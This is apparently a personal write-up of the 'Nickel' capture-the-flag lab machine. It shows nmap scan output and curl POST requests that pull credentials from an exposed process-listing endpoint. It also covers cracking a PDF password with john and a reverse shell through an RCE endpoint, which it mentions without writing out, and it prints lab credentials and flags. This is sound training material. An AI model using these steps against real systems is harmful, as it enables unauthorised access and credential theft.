# Nickel \[Inter]

## Report

HTTP website has three buttons which do not redirect properly, accessing the URL directly however shows a message 'Invalid Token'. Changing request method to POST suggests adding another header requiring 'Content Length' which gets it working. Visiting the second endpoint 'running-processes' exposes creds for user 'ariah'.

Use that password for FTP and access password protected PDF via john. Visit the RCE endpoint as described in document and fire a reverse shell for SYSTEM.

## Enumeration

192.168.202.99

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-26T08:17:21+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2025-10-26T08:16:13+00:00
| ssl-cert: Subject: commonName=nickel
| Issuer: commonName=nickel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-25T08:11:22
| Not valid after:  2026-04-26T08:11:22
| MD5:   2080:e812:5c22:3b2f:9ee2:353a:c6fd:85fb
|_SHA-1: 52d8:bb13:0bdc:6315:a9ed:0c88:0bf8:fe09:637a:eba9
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-favicon: Unknown favicon MD5: 9D1EAD73E678FA2F51A70A933B0BF017
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: GET
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: 76C5844B4ABE20F72AA23CBE15B2494E
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

#### SMB

Guest account disabled

#### FTP

Anonymous access disabled

### Files

SSH there, keys maybe?

### Initial Foothold

HTTP site on 8089 shows 3 buttons showing diff info

<div align="left"><figure><img src="../../../.gitbook/assets/image (3).png" alt="" width="563"><figcaption></figcaption></figure></div>

They don't work but accessing the URL directly shows 'invalid token' - change request method

```
└─$ curl -i http://$ip:33333/list-running-procs -X POST                       
HTTP/1.1 411 Length Required
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Sun, 26 Oct 2025 08:45:19 GMT
Connection: close
Content-Length: 344

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Length Required</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Length Required</h2>
<hr><p>HTTP Error 411. The request must be chunked or have a content length.</p>
</BODY></HTML>

```

```
curl -i http://$ip:33333/list-running-procs -X POST -H 'Content-Length: 0'
```

This returns running process and exposes creds for user 'ariah'

## PrivEsc

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Find this pdf from FTP with 'ariah' creds, need a password, crack with john

EDIT: The web server didn't load on port 80 lol had to revert it that's why https was loading prior

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

## Loot

### Creds

`ariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK`

`NowiseSloopTheory139` \[b64 -d]

### Flags

`local:1693388138cb8a4c53b2decd6eea9795`

`proof:0faafaeaa6113ed1439004871cda9529`

## Proof

If a web request doesn't work, THE BROWSER IS NOT BROKEN FFS USE YOUR BRAIN
